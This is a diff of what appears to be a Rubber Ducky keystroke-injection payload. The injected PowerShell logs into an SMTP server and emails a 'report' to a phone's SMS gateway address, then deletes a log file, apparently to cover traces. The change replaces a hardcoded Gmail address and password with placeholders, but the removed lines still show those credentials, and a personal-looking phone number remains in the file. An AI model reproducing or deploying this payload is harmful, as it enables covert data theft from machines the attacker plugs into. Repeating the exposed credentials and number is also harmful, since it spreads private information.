@@ -27,11 +27,11 @@ STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
 ENTER
 STRING $SMTPInfo.EnableSsl = $true
 ENTER
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('billgatesducky@gmail.com', 'Micr0$0ft')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('INSERT_EMAIL_HERE', 'INSERT_PASSWD_HERE')
 ENTER
 STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
 ENTER
-STRING $ReportEmail.From = 'billgatesducky@gmail.com'
+STRING $ReportEmail.From = 'INSERT_EMAIL_HERE'
 ENTER
 REM carriers @message.alltel.com @txt.att.net @myboostmobile.com @messaging.sprintpcs.com @email.uscc.net @vtext.com @vmobl.com @text.republicwireless.com
 STRING $ReportEmail.To.Add('9197717601@tmomail.net')
@@ -48,4 +48,5 @@ ENTER
 DELAY 500
 STRING del log 
 REM & exit
+
 ENTER
